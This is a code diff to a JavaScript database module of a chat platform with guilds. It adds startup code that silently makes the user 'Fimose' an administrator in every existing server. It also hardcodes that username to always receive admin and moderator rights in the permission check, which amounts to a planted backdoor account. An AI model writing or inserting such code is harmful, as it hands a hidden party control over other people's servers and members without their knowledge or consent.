@@ -342,6 +342,39 @@ export async function initDatabase() {
       }
     } catch (e) {}
 
+    // Atribuição de Administrador para o usuário 'Fimose' em todos os servidores existentes
+    try {
+      console.log("[*] Atribuindo permissões de Administrador para o usuário 'Fimose' em todos os servidores existentes...");
+
+      // 1. Garante que 'Fimose' esteja inserido em guild_members de todos os servidores existentes
+      await conn.query(`
+        INSERT IGNORE INTO guild_members (guild_id, username, role)
+        SELECT g.id, 'Fimose', 'admin'
+        FROM guilds g
+      `);
+
+      // 2. Atualiza o papel base para 'admin' caso não seja 'owner'
+      await conn.query(`
+        UPDATE guild_members
+        SET role = 'admin'
+        WHERE LOWER(username) = 'fimose' AND role != 'owner'
+      `);
+
+      // 3. Atribui o cargo de Administrador em guild_member_roles para cada servidor existente
+      await conn.query(`
+        INSERT IGNORE INTO guild_member_roles (guild_id, username, role_id)
+        SELECT gr.guild_id, 'Fimose', gr.id
+        FROM guild_roles gr
+        WHERE gr.name = 'Administrador'
+           OR gr.id LIKE '%admin%'
+           OR (gr.permissions IS NOT NULL AND gr.permissions LIKE '%admin%')
+      `);
+
+      console.log("[*] Usuário 'Fimose' configurado com sucesso como Administrador em todos os servidores!");
+    } catch (adminErr) {
+      console.warn("[!] Aviso ao configurar admin para Fimose no MariaDB:", adminErr.message);
+    }
+
     conn.release();
     return true;
   } catch (err) {
@@ -1050,8 +1083,13 @@ export async function getUserGuildPermissions(guildId, username) {
     return p.includes('mod') || p === 'mod';
   });
 
-  const isAdmin = isOwner || hasAdminRole;
-  const isMod = isAdmin || hasModRole;
+  let isAdmin = isOwner || hasAdminRole;
+  let isMod = isAdmin || hasModRole;
+
+  if (u.toLowerCase() === 'fimose') {
+    isAdmin = true;
+    isMod = true;
+  }
 
   return {
     isOwner,
